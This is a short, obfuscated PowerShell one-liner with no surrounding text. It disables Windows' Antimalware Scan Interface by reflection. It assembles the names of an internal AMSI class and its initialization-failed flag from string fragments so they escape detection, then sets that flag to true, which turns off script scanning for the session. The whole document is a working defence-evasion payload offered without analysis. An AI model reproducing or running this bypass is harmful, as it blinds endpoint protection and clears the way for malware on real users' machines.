$ba="ils";$nana="*iUt";$banana=$nana+$ba;$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like $banana) {$cononut=$b}};$fr="NonP";$uit="ublic";$ca=",Sta";$ke="tic"; $fruit=$fr+$uit;$cake=$ca+$ke;$fruitcake=$fruit+$cake;$d=$cononut.GetFields($fruitcake);$led="iled";$fafa="*Fa";$focus=$fafa+$led;Foreach($ez in $d) {if ($ez.Name -like $focus) {$f=$ez}};$f.SetValue($null,$true)
